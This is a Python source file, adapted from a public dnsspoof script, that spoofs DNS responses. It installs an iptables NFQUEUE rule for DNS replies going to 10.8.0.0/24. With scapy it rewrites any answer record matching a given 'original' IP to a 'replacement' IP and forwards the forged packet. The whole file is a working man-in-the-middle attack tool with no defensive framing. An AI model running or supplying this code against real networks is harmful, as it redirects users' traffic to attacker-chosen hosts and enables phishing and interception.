# Originally based on https://github.com/DanMcInerney/dnsspoof/blob/master/dnsspoof.py
# Replaced https://github.com/blochberger/python-nfqueue
# with
# https://github.com/oremanj/python-netfilterqueue

from twisted.internet import reactor
import os
from netfilterqueue import NetfilterQueue
from scapy.all import *
import argparse
import threading
import signal

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--original", help="Original IP")
    parser.add_argument("-r", "--replacement", help="Replacement IP")
    return parser.parse_args()

def cb(packet):
    data = packet.get_payload()
    pkt = IP(data)
    # print packet
    #pkt.show()
    if pkt.haslayer(DNSRR) and \
       pkt[DNS].an and \
       any(arg_parser().original == pkt[DNS].an[i].rdata for i in range(pkt[DNS].ancount)):
        spoofed_pkt(packet, pkt, arg_parser().replacement)
    else:
        packet.accept()

def spoofed_pkt(packet, pkt, rIP):
    ip = pkt['IP']
    udp = pkt['UDP']
    dns = pkt['DNS']
    for i in range(dns.ancount):
        dnsrr = dns.an[i]

        if (dnsrr.rdata == arg_parser().original):
            dnsrr.rdata = rIP
            del pkt[IP].len
            del pkt[UDP].len
            del pkt[IP].chksum
            del pkt[UDP].chksum

    #print("Modified packet:")
    #IP(bytes(pkt)).show()

    packet.set_payload(bytes(pkt))
    packet.accept()
    print ('[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1])

class Queued(object):
    def __init__(self):
        self.q = NetfilterQueue()
        self.q.bind(10500, cb)
        reactor.addReader(self)
        print('[*] Waiting for data')
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.run(block=False)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'

def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    # the response-packet will not pass through the nat table!
    # see this comment: https://superuser.com/questions/1210742/does-iptables-perform-a-automatically-snat-for-response-packet-if-it-does-when#comment1851968_1225093
    os.system('iptables -t filter -I FORWARD 1 -p udp --sport 53 --dst 10.8.0.0/24 -j NFQUEUE --queue-num 10500')

    Queued()
    rctr = threading.Thread(target=reactor.run, args=(False,))
    rctr.daemon = True
    rctr.start()

    def signal_handler(signal, frame):
        print('removing iptables rule and turning off IP forwarding...')
        os.system('iptables -t filter -D FORWARD -p udp --sport 53 --dst 10.8.0.0/24 -j NFQUEUE --queue-num 10500')
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while 1:
        time.sleep(1.5)

main(arg_parser())
